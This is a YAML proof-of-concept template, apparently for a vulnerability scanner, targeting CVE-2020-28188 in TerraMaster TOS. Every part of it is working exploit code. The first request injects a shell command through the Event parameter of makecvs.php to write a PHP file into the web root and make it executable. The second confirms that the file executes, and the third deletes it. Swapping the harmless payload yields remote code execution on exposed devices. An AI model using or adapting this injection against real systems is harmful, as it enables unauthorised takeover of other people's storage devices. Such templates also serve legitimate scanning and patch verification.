name: poc-yaml-terramastertos-cve-2020-28188-rce
rules:
  - method: GET
    header:
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    path: /include/makecvs.php?Event=http|echo%20"<?php%20echo%20md5(1)?>"%20>>%20/usr/www/testtest.php%20&&%20chmod%20755%20/usr/www/testtest.php||
    follow_redirects: false
    expression: |
      response.body.bcontains(bytes("Service,DateTime")) && response.status == 200 && "text/csv" in response.headers
  - method: GET
    header:
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    path: /testtest.php
    follow_redirects: false
    expression: |
      response.body.bcontains(bytes("c4ca4238a0b923820dcc509a6f75849b")) && response.status == 200
  - method: GET
    header:
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    path: /include/makecvs.php?Event=http%7Crm%20/usr/www/testtest.php%7C%7C
    follow_redirects: false
    expression: |
      response.body.bcontains(bytes("Service,DateTime")) && response.status == 200 && "text/csv" in response.headers
detail:
  author: 1au
  links:
    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202012-1548
